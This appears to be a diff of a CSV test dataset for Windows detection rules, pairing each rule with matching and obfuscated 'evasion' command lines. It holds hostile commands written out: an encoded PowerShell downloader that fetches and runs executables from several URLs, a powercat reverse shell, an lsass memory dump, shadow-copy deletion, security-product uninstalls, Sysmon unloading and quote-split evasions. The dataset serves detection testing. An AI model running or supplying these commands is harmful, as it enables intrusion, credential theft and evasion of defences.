+win_susp_powershell_enc_cmd,Microsoft-Windows-Sysmon_1_Match_02.json,powershell -enc JABBAHUASwA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABNAEIAQQA9ACcAaAB0AHQAcAA6AC8ALwBtAGkAZQBrAG8AdwBvAC4AcABsAC8AYgBnADQAOABDAGcAbABaAEAAaAB0AHQAcAA6AC8ALwBlAG4AdAByAGUAcAByAGUAbgBhAGIAbABlADIAdwBwAC4AZQB4AGkAZwBpAG8ALgBjAG8AbQAvAHYAMwBsAFcAWgBBAEwAQABoAHQAdABwADoALwAvAGQAZQBtAG8ALgBkAHMAaQBzAHQAZQBtAGEAcwAuAG4AZQB0AC8AdwBjAGsAVgBqAGMAMgBnAEcAYgBAAGgAdAB0AHAAOgAvAC8AZwBpAGEAbgBjAGEAcgBsAG8ALQBjAGEAcwB0AGkAbABsAG8ALgBjAG8AbQAvAFYAVAByAHIAVgBUAHIAeABqAGQAQABoAHQAdABwADoALwAvAGgAdQBlAGwAbABhAHMAaQBtAHAAcgBlAHMAYQBzAC4AYwBvAG0ALwAyAHMAcQBvAGwANQBrAHkAUABGACcALgBTAHAAbABpAHQAKAAnAEAAJwApADsAJABQAFkAdwAgAD0AIAAnADUAOQAyACcAOwAkAG0ARABjAD0AJABlAG4AdgA6AHAAdQBiAGwAaQBjACsAJwBcACcAKwAkAFAAWQB3ACsAJwAuAGUAeABlACcAOwBmAG8AcgBlAGEAYwBoACgAJABvAEcAegAgAGkAbgAgACQATQBCAEEAKQB7AHQAcgB5AHsAJABBAHUASwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJABvAEcAegAsACAAJABtAEQAYwApADsASQBuAHYAbwBrAGUALQBJAHQAZQBtACAAJABtAEQAYwA7AGIAcgBlAGEAawA7AH0AYwBhAHQAYwBoAHsAfQB9ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAA= 
+win_susp_powershell_hidden_b64_cmd,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"powershell -WindowStyle h""id""den -nop -encodedcommand anotherTy5Db21wcmVzc2lvbencoding"
+win_susp_powershell_hidden_b64_cmd,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"powershell -WindowStyle hid""de""n -nop -encodedcommand encoded1lbW1vdmcommand"
+win_susp_powershell_hidden_b64_cmd,Microsoft-Windows-Sysmon_1_Match_01.json,powershell -WindowStyle hidden -nop -encodedcommand  somethingRjaHVua19zaXplencoded
+win_susp_powershell_hidden_b64_cmd,Microsoft-Windows-Sysmon_1_Match_03.json,powershell -WindowStyle hidden -nop -encodedcommand encoded1lbW1vdmcommand
+win_susp_powershell_hidden_b64_cmd,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"powershell -WindowStyle hi""dd""en  -nop -encodedcommand somethingRjaHVua19zaXplencoded"
+win_susp_powershell_hidden_b64_cmd,Microsoft-Windows-Sysmon_1_Match_02.json,powershell -WindowStyle hidden -nop -encodedcommand anotherTy5Db21wcmVzc2lvbencoding
+win_susp_procdump,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,procdump ls -ma
+win_susp_procdump,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,procdump /ma ls
+win_susp_procdump,Microsoft-Windows-Sysmon_1_Match_01.json,procdump -ma lsass
+win_susp_procdump,Microsoft-Windows-Sysmon_1_Match_03.json,procdump -ma ls
+win_susp_procdump,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,procdump /ma lsass
+win_susp_procdump,Microsoft-Windows-Sysmon_1_Match_02.json,procdump -ma ls
+win_susp_ps_appdata,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"""C:\Windows\System32\cmd.exe"" /c po""wersh""ell -w hidden -exec bypass cd C:\Users\admin\AppData\Local\nothinghere\; . .\cat.ps1; CoNnEct-PoWErcat -Mode Tcp -RemoteIp 192.168.94.138 -Port 443 -Execute "
+win_susp_ps_appdata,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"""C:\Windows\System32\cmd.exe"" /c power""she""ll -w hidden -exec bypass cd C:\Users\admin\AppData\Local\secretstuff\; . .\cat.ps1; CoNnEct-PoWErcat -Mode Tcp -RemoteIp 192.168.94.138 -Port 443 -Execute "
+win_susp_ps_appdata,Microsoft-Windows-Sysmon_1_Match_01.json,"""C:\Windows\System32\cmd.exe"" /c powershell -w hidden -exec bypass cd C:\Users\admin\AppData\Local\catchme\; . .\cat.ps1; CoNnEct-PoWErcat -Mode Tcp -RemoteIp 192.168.94.138 -Port 443 -Execute "
+win_susp_ps_appdata,Microsoft-Windows-Sysmon_1_Match_03.json,"""C:\Windows\System32\cmd.exe"" /c powershell -w hidden -exec bypass cd C:\Users\admin\AppData\Local\secretstuff\; . .\cat.ps1; CoNnEct-PoWErcat -Mode Tcp -RemoteIp 192.168.94.138 -Port 443 -Execute "
+win_susp_ps_appdata,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"""C:\Windows\System32\cmd.exe"" /c p""ower""shell -w hidden -exec bypass cd C:\Users\admin\AppData\Local\catchme\; . .\cat.ps1; CoNnEct-PoWErcat -Mode Tcp -RemoteIp 192.168.94.138 -Port 443 -Execute "
+win_susp_ps_appdata,Microsoft-Windows-Sysmon_1_Match_02.json,"""C:\Windows\System32\cmd.exe"" /c powershell -w hidden -exec bypass cd C:\Users\admin\AppData\Local\nothinghere\; . .\cat.ps1; CoNnEct-PoWErcat -Mode Tcp -RemoteIp 192.168.94.138 -Port 443 -Execute "
+win_susp_psr_capture_screenshots,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,psr.exe -start -gui 100 -output C:\Users\User\output.zip
+win_susp_psr_capture_screenshots,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,psr.exe -start /gui 20 /output C:\Users\User\nothingtoseehere.zip
+win_susp_psr_capture_screenshots,Microsoft-Windows-Sysmon_1_Match_01.json,psr.exe /start /gui 0 /output C:\Users\User\out.zip
+win_susp_psr_capture_screenshots,Microsoft-Windows-Sysmon_1_Match_03.json,psr.exe /start /gui 20 /output C:\Users\User\nothingtoseehere.zip
+win_susp_psr_capture_screenshots,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,psr.exe -start /gui 0 /output C:\Users\User\out.zip
+win_susp_psr_capture_screenshots,Microsoft-Windows-Sysmon_1_Match_02.json,psr.exe /start /gui 100 /output C:\Users\User\output.zip
+win_susp_rar_flags,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"C:\Program Files\WinRAR\WinRAR.exe"" a -""m""5 -r -inul -""hp""<drowssap> notmalicious.rar thisisfine.exe"
+win_susp_rar_flags,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"C:\Program Files\WinRAR\WinRAR.exe"" a /""m5"" /r /inul /""hp""<mylittlesecret> normal.rar justa.txt"
+win_susp_rar_flags,Microsoft-Windows-Sysmon_1_Match_01.json,"C:\Program Files\WinRAR\WinRAR.exe"" a -m5 -r -inul -hp<password> example.rar <example>"
+win_susp_rar_flags,Microsoft-Windows-Sysmon_1_Match_03.json,"C:\Program Files\WinRAR\WinRAR.exe"" a -m5 -r -inul -hp<mylittlesecret> normal.rar justa.txt"
+win_susp_rar_flags,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"C:\Program Files\WinRAR\WinRAR.exe"" a /m5 /r /inul /hp<password> example.rar <example>"
+win_susp_rar_flags,Microsoft-Windows-Sysmon_1_Match_02.json,"C:\Program Files\WinRAR\WinRAR.exe"" a -m5 -r -inul -hp<drowssap> notmalicious.rar thisisfine.exe"
+win_susp_recon_activity,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,net   localgroup   administrators
+win_susp_recon_activity,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"""net"" gr""o""up ""enterprise admins"" ""/dom""ain"
+win_susp_recon_activity,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"""ne""t.ex""""e   l""oca""lgroup    ad""mini""stra""tor""s"
+win_susp_recon_activity,Microsoft-Windows-Sysmon_1_Match_01.json,"net group ""domain admins"" /domain"
+win_susp_recon_activity,Microsoft-Windows-Sysmon_1_Match_03.json,"net group ""enterprise admins"" /domain"
+win_susp_recon_activity,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"net.exe group ""domain admins"" /domain"
+win_susp_recon_activity,Microsoft-Windows-Sysmon_1_Match_02.json,net localgroup administrators
+win_susp_regsvr32_anomalies,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,regsvr32.exe /n -i:http://something scrobj.dll
+win_susp_regsvr32_anomalies,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"* ..\..\..\Windows\\""Sys""tem32\\""reg""svr32.exe *"
+win_susp_regsvr32_anomalies,Microsoft-Windows-Sysmon_1_Match_01.json,regsvr32 -i Path\To\Temp\\file.dll
+win_susp_regsvr32_anomalies,Microsoft-Windows-Sysmon_1_Match_03.json,excel ..\..\..\Windows\System32\regsvr32.exe *
+win_susp_regsvr32_anomalies,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"regsvr32 -i Path\To\T""emp""\\file.dll"
+win_susp_regsvr32_anomalies,Microsoft-Windows-Sysmon_1_Match_02.json,regsvr32.exe /n /i:http://something scrobj.dll
+win_susp_regsvr32_flags_anomaly,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,regsvr32 -s -i:UserInstall c:\another\path\to\some.dll
+win_susp_regsvr32_flags_anomaly,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,regsvr32.exe -s -i:UserInstall kasd21.dll
+win_susp_regsvr32_flags_anomaly,Microsoft-Windows-Sysmon_1_Match_01.json,regsvr32 /s /i:UserInstall c:\path\a.dll
+win_susp_regsvr32_flags_anomaly,Microsoft-Windows-Sysmon_1_Match_03.json,regsvr32.exe /s /i:UserInstall kasd21.dll
+win_susp_regsvr32_flags_anomaly,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,regsvr32 /s -i:UserInstall c:\path\a.dll
+win_susp_regsvr32_flags_anomaly,Microsoft-Windows-Sysmon_1_Match_02.json,regsvr32 /s /i:UserInstall c:\another\path\to\some.dll
+win_susp_rundll32_activity,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"C:\Windows\system32\rundll32.exe url.dll , OpenURLA file://c:\windows\system32\calc.exe"
+win_susp_rundll32_activity,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"rundll32.exe ""url.dll""   ,   FileProtocolHandler calc.exe"
+win_susp_rundll32_activity,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_06.json,"rundll32 ""javascript"":""\..\mshtml,RunHTMLApplication "";alert(""foo"");"
+win_susp_rundll32_activity,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"rundll32 ""zipfldr.dll""    , RouteTheCall calc.exe"
+win_susp_rundll32_activity,Microsoft-Windows-Sysmon_1_Match_01.json,"rundll32 url.dll, OpenURL file://c:\windows\system32\calc.exe"
+win_susp_rundll32_activity,Microsoft-Windows-Sysmon_1_Match_03.json,"rundll32.exe url.dll, FileProtocolHandler calc.exe"
+win_susp_rundll32_activity,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"rundll32 ""url.dll"", OpenURL file://c:\windows\system32\calc.exe"
+win_susp_rundll32_activity,Microsoft-Windows-Sysmon_1_Match_04.json,"rundll32 zipfldr.dll, RouteTheCall calc.exe"
+win_susp_rundll32_activity,Microsoft-Windows-Sysmon_1_Match_06.json,"rundll32 javascript:""\..\mshtml,RunHTMLApplication "";alert(""foo"");"
+win_susp_rundll32_activity,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,"C:\Windows\System32\rundll32.exe ""Shell32.dll"", Control_RunDLL "
+win_susp_rundll32_activity,Microsoft-Windows-Sysmon_1_Match_02.json,"C:\Windows\system32\rundll32.exe url.dll, OpenURLA file://c:\windows\system32\calc.exe"
+win_susp_rundll32_activity,Microsoft-Windows-Sysmon_1_Match_05.json,"C:\Windows\System32\rundll32.exe Shell32.dll, Control_RunDLL "
+win_susp_rundll32_by_ordinal,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"C:\Windows\System32\""run""dll32.exe r4nd0m.dll ,#4"
+win_susp_rundll32_by_ordinal,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"rundll32 justa.dll ,#2"
+win_susp_rundll32_by_ordinal,Microsoft-Windows-Sysmon_1_Match_01.json,"C:\Windows\System32\rundll32.exe susp31.dll ,#1"
+win_susp_rundll32_by_ordinal,Microsoft-Windows-Sysmon_1_Match_03.json,"C:\Windows\System32\rundll32.exe justa.dll ,#2"
+win_susp_rundll32_by_ordinal,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"rundll32.exe susp31.dll ,#1"
+win_susp_rundll32_by_ordinal,Microsoft-Windows-Sysmon_1_Match_02.json,"C:\Windows\System32\rundll32.exe r4nd0m.dll ,#4"
+win_susp_schtask_creation,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"schtasks.exe /""create"" /sc daily /tn <name> /tr notepad.exe"
+win_susp_schtask_creation,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"schtasks.exe -""create"" /sc daily /tn mytask /tr powershell.exe"
+win_susp_schtask_creation,Microsoft-Windows-Sysmon_1_Match_01.json,schtasks /create /sc daily /tn <name> /tr cmd.exe
+win_susp_schtask_creation,Microsoft-Windows-Sysmon_1_Match_03.json,schtasks.exe /create /sc daily /tn mytask /tr powershell.exe
+win_susp_schtask_creation,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,schtasks -create /sc daily /tn <name> /tr cmd.exe
+win_susp_schtask_creation,Microsoft-Windows-Sysmon_1_Match_02.json,schtasks.exe /create /sc daily /tn <name> /tr notepad.exe
+win_susp_script_execution,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"wscript some.""j""se"
+win_susp_script_execution,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"C:\Windows\System32\cscript.exe somedir\somefile.""v""ba"
+win_susp_script_execution,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"wscript.exe C:\Dir\AnotherDir\myfile"".""vbe"
+win_susp_script_execution,Microsoft-Windows-Sysmon_1_Match_01.json,cscript C:\Path\To\File.js
+win_susp_script_execution,Microsoft-Windows-Sysmon_1_Match_03.json,C:\Windows\System32\cscript.exe somedir\somefile.vba
+win_susp_script_execution,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"cscript C:\Another\Path\To\AnotherFile.""j""s"
+win_susp_script_execution,Microsoft-Windows-Sysmon_1_Match_04.json,wscript.exe C:\Dir\AnotherDir\myfile.vbe
+win_susp_script_execution,Microsoft-Windows-Sysmon_1_Match_02.json,wscript some.jse
+win_susp_service_path_modification,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"sc config servicename b""in""Path=cmd.exe"
+win_susp_service_path_modification,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"sc.exe co""nf""ig servicename ""bin""Path=cmd.exe"
+win_susp_service_path_modification,Microsoft-Windows-Sysmon_1_Match_01.json,sc config servicename binPath=powershell.exe
+win_susp_service_path_modification,Microsoft-Windows-Sysmon_1_Match_03.json,sc.exe config servicename binPath=cmd.exe
+win_susp_service_path_modification,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"sc co""nfig"" servicename binPath=powershell.exe"
+win_susp_service_path_modification,Microsoft-Windows-Sysmon_1_Match_02.json,sc config servicename binPath=cmd.exe
+win_susp_squirrel_lolbin,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,C:\Users\Username\AppData\Local\App\Update.exe -processStartAndWait random.exe
+win_susp_squirrel_lolbin,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,C:\Users\vki\Appdata\Local\Discord\Update.exe /createShortcut C:\Path\To\File.exe -l Desktop
+win_susp_squirrel_lolbin,Microsoft-Windows-Sysmon_1_Match_01.json,C:\Users\Username\AppData\Local\App\Update.exe --processStart random.exe
+win_susp_squirrel_lolbin,Microsoft-Windows-Sysmon_1_Match_03.json,C:\Users\vki\Appdata\Local\Discord\Update.exe --createShortcut C:\Path\To\File.exe -l Desktop
+win_susp_squirrel_lolbin,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"C:\Users\Username\AppData\Local\App\Update.exe --process""Start"" random.exe"
+win_susp_squirrel_lolbin,Microsoft-Windows-Sysmon_1_Match_02.json,C:\Users\Username\AppData\Local\App\Update.exe --processStartAndWait random.exe
+win_susp_svchost_no_cli,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"sv""cho""st.exe"
+win_susp_svchost_no_cli,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"C:\Windows\System32\sv""cho""st"
+win_susp_svchost_no_cli,Microsoft-Windows-Sysmon_1_Match_01.json,svchost.exe
+win_susp_svchost_no_cli,Microsoft-Windows-Sysmon_1_Match_03.json,C:\Windows\System32\svchost.exe
+win_susp_svchost_no_cli,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,svchost
+win_susp_svchost_no_cli,Microsoft-Windows-Sysmon_1_Match_02.json,svchost.exe
+win_susp_sysprep_appdata,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"""sysprep.exe"" C:\Users\admin\AppData\Local\Temp\gupdate.exe"
+win_susp_sysprep_appdata,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,sysprep C:\Users\admin\AppData\Local\Temp\gupdate.exe
+win_susp_sysprep_appdata,Microsoft-Windows-Sysmon_1_Match_01.json,C:\Windows\system32\sysprep\sysprep.exe C:\Users\admin\AppData\Local\Temp\gupdate.exe
+win_susp_sysprep_appdata,Microsoft-Windows-Sysmon_1_Match_03.json,sysprep.exe C:\Users\admin\AppData\Local\Temp\gupdate.exe
+win_susp_sysprep_appdata,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"C:\Windows\system32\sysprep\sy""spr""ep.exe C:\Users\admin\AppData\Local\Temp\gupdate.exe"
+win_susp_sysprep_appdata,Microsoft-Windows-Sysmon_1_Match_02.json,sysprep.exe C:\Users\admin\AppData\Local\Temp\gupdate.exe
+win_susp_sysvol_access,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"findstr -S -I cpassword \\ComputerName\sysvol\ComputerName\p""olici""es\*.xml"
+win_susp_sysvol_access,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"findstr /S /I cpassword \\ComputerName\sysvol\\ComputerName\p""ol""icies\\*.xml"
+win_susp_sysvol_access,Microsoft-Windows-Sysmon_1_Match_01.json,findstr /S /I cpassword \\ComputerName\sysvol\ComputerName\policies\*.xml
+win_susp_sysvol_access,Microsoft-Windows-Sysmon_1_Match_03.json,findstr /S /I cpassword \\ComputerName\sysvol\ComputerName\policies\*.xml
+win_susp_sysvol_access,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"findstr /S /I cpassword \\ComputerName\s""ysv""ol\ComputerName\po""lici""es\*.xml"
+win_susp_sysvol_access,Microsoft-Windows-Sysmon_1_Match_02.json,findstr -S -I cpassword \\ComputerName\sysvol\ComputerName\policies\*.xml
+win_susp_tscon_rdp_redirect,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"tscon 1 /d""es""t"":""rdp-tcp:46"
+win_susp_tscon_rdp_redirect,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"tscon 1 /dest:r""dp-tc""p:22"
+win_susp_tscon_rdp_redirect,Microsoft-Windows-Sysmon_1_Match_01.json,tscon 1 /dest:rdp-tcp:55
+win_susp_tscon_rdp_redirect,Microsoft-Windows-Sysmon_1_Match_03.json,tscon 1 /dest:rdp-tcp:22
+win_susp_tscon_rdp_redirect,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,tscon 1 -dest:rdp-tcp:55
+win_susp_tscon_rdp_redirect,Microsoft-Windows-Sysmon_1_Match_02.json,tscon 1 /dest:rdp-tcp:46
+win_susp_volsnap_disable,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"reg.exe ""add"" HKLM\SYSTEM\CurrentControlSet\Ser""vice""s\VSS\D""ia""g\Volsnap /ve /f /d Disabled"
+win_susp_volsnap_disable,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"r""eg"".exe a""d""d HKLM\SYSTEM\CurrentControlSet\Se""rvi""ces\V""SS""\D""ia""g\Volsnap /ve /f /""d"" Di""sable""d"
+win_susp_volsnap_disable,Microsoft-Windows-Sysmon_1_Match_01.json,reg add HKLM\SYSTEM\CurrentControlSet\Services\VSS\Diag\Volsnap /ve /f /d Disabled
+win_susp_volsnap_disable,Microsoft-Windows-Sysmon_1_Match_03.json,reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\VSS\Diag\Volsnap /ve /f /d Disabled
+win_susp_volsnap_disable,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"r""""eg add HKLM\SYSTEM\CurrentControlSet\Services\VSS\Diag\Volsnap /ve /f /d Dis""able""d"
+win_susp_volsnap_disable,Microsoft-Windows-Sysmon_1_Match_02.json,reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\VSS\Diag\Volsnap /ve /f /d Disabled
+win_susp_wmi_execution,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"wmic ""path"" ""AntiVirusProduct"" ""get"" /format:list"
+win_susp_wmi_execution,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"wmic ""path"" ""FirewallProduct"" ""get"" /format:list"
+win_susp_wmi_execution,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"wmic ""shadowcopy"" ""delete"" /nointeractive"
+win_susp_wmi_execution,Microsoft-Windows-Sysmon_1_Match_01.json,"wmic /node:<remote-ip> /user:<username> process call create ""C:\Windows\Temp\Setup.exe <-n process name> <-l port >"""
+win_susp_wmi_execution,Microsoft-Windows-Sysmon_1_Match_03.json,wmic path FirewallProduct get /format:list
+win_susp_wmi_execution,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"wmic /node:<remote-ip> /user:<username> ""process"" ""call"" ""create"" ""C:\Windows\Temp\Setup.exe <-n process name> <-l port >"""
+win_susp_wmi_execution,Microsoft-Windows-Sysmon_1_Match_04.json,wmic shadowcopy delete /nointeractive
+win_susp_wmi_execution,Microsoft-Windows-Sysmon_1_Match_02.json,wmic path AntiVirusProduct get /format:list
+win_susp_wmic_proc_create_rundll32,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"wmic process ""call"" create ""rundll32 C:\Another\Path\To\another.dll"", StartW"
+win_susp_wmic_proc_create_rundll32,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"wmic ""process"" ""call"" ""create"" ""rundll32 C:\And\Another\Path\To\yetanother.dll"", StartW"
+win_susp_wmic_proc_create_rundll32,Microsoft-Windows-Sysmon_1_Match_01.json,"wmic process call create ""rundll32 C:\PathTo\my.dll"", StartW"
+win_susp_wmic_proc_create_rundll32,Microsoft-Windows-Sysmon_1_Match_03.json,"wmic process call create ""rundll32 C:\And\Another\Path\To\yetanother.dll"", StartW"
+win_susp_wmic_proc_create_rundll32,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"wmic ""process"" call create ""rundll32 C:\PathTo\my.dll"", StartW"
+win_susp_wmic_proc_create_rundll32,Microsoft-Windows-Sysmon_1_Match_02.json,"wmic process call create ""rundll32 C:\Another\Path\To\another.dll"", StartW"
+win_susp_wmic_security_product_uninstall,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"wmic product where name=""Windows Defender"" call uninstall -nointeractive"
+win_susp_wmic_security_product_uninstall,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"wmic product where name=""Endpoint Sensor"" call uninstall"
+win_susp_wmic_security_product_uninstall,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"wmic ""product"" ""where"" name=""Endpoint Detection"" call uninstall /nointeractive"
+win_susp_wmic_security_product_uninstall,Microsoft-Windows-Sysmon_1_Match_01.json,"wmic product where name=""Antivirus"" call uninstall /nointeractive"
+win_susp_wmic_security_product_uninstall,Microsoft-Windows-Sysmon_1_Match_03.json,"wmic product where name=""Endpoint Sensor"" call uninstall /nointeractive"
+win_susp_wmic_security_product_uninstall,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"w""mi""c product where name=""Antivirus"" call uninstall /nointeractive"
+win_susp_wmic_security_product_uninstall,Microsoft-Windows-Sysmon_1_Match_02.json,"wmic.exe product where name=""Windows Defender"" call uninstall /nointeractive"
+win_sysmon_driver_unload,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"fltmc unload s""ys""mondrv"
+win_sysmon_driver_unload,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"fltmc un""loa""d sy""smo""ndrv"
+win_sysmon_driver_unload,Microsoft-Windows-Sysmon_1_Match_01.json,fltmc unload SysmonDrv
+win_sysmon_driver_unload,Microsoft-Windows-Sysmon_1_Match_03.json,fltmc unload sysmonDrv
+win_sysmon_driver_unload,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"fltmc un""loa""d SysmonDrv"
+win_sysmon_driver_unload,Microsoft-Windows-Sysmon_1_Match_02.json,fltmc unload sysmondrv
+win_task_folder_evasion,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"fsutil file createnew C:\Windows\Sys""tem32""\Tasks\anothernewfile 1000"
+win_task_folder_evasion,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"fsutil f""ile"" creat""ene""w C:\Windows\Sys""WOW""64\Tasks\newSysWOWfile 1000"
+win_task_folder_evasion,Microsoft-Windows-Sysmon_1_Match_01.json,fsutil file createnew C:\Windows\System32\Tasks\newfile 1000
+win_task_folder_evasion,Microsoft-Windows-Sysmon_1_Match_03.json,fsutil file createnew C:\Windows\SysWOW64\Tasks\newSysWOWfile 1000
+win_task_folder_evasion,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"fsutil file cre""ate""new C:\Windows\System32\Tasks\newfile 1000"
+win_task_folder_evasion,Microsoft-Windows-Sysmon_1_Match_02.json,fsutil file createnew C:\Windows\System32\Tasks\anothernewfile 1000
+win_trust_discovery,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"nltest /do""main""_trusts /all_t""rust""s"
+win_trust_discovery,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"nltest.exe /dc""list"":domainname"
+win_trust_discovery,Microsoft-Windows-Sysmon_1_Match_01.json,nltest /dclist:domainname
+win_trust_discovery,Microsoft-Windows-Sysmon_1_Match_03.json,nltest.exe /dclist:domainname
+win_trust_discovery,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"nltest /dc""li""st:domainname"
+win_trust_discovery,Microsoft-Windows-Sysmon_1_Match_02.json,nltest /domain_trust /all_trusts
+win_using_sc_to_change_sevice_image_path_by_non_admin,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"sc fai""""lure"" serviecename com""man""d=cmd.exe"
+win_using_sc_to_change_sevice_image_path_by_non_admin,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"sc c""on""fig servicename binPath=calc.exe"
+win_using_sc_to_change_sevice_image_path_by_non_admin,Microsoft-Windows-Sysmon_1_Match_01.json,sc config servicename binPath=calc.exe
+win_using_sc_to_change_sevice_image_path_by_non_admin,Microsoft-Windows-Sysmon_1_Match_03.json,sc config servicename binPath=notepad.exe 
+win_using_sc_to_change_sevice_image_path_by_non_admin,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"sc c^onf""g servicename bin""Path=calc.exe"
+win_using_sc_to_change_sevice_image_path_by_non_admin,Microsoft-Windows-Sysmon_1_Match_02.json,sc failure servicename command=cmd.exe
+win_vul_java_remote_debugging,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"java <name> -Xdebug -Xrunjdwp:transport=dt_socket,server=y,address=4711, suspend=n"
+win_vul_java_remote_debugging,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"java <name> -Xdebug -Xrunjdwp:transport=dt_socket,suspend=n,server=y,address=4242"
+win_vul_java_remote_debugging,Microsoft-Windows-Sysmon_1_Match_01.json,"java appname -Xdebug -Xrunjdwp:transport=dt_socket,address=1.2.3.4"
+win_vul_java_remote_debugging,Microsoft-Windows-Sysmon_1_Match_03.json,"java <name> -Xdebug -Xrunjdwp:server=y,suspend=n,transport=dt_socket,address=4.7.1.1"
+win_vul_java_remote_debugging,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"java <name> -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=1337"
+win_vul_java_remote_debugging,Microsoft-Windows-Sysmon_1_Match_02.json,"java <name> -Xdebug -Xrunjdwp:transport=dt_socket,address=1.3.3.7,server=y,suspend=n"
+win_webshell_detection,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"sch""tasks"
+win_webshell_detection,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,net.exe user username
+win_webshell_detection,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,ping.exe -n 10
+win_webshell_detection,Microsoft-Windows-Sysmon_1_Match_01.json,netstat
+win_webshell_detection,Microsoft-Windows-Sysmon_1_Match_03.json,net user username
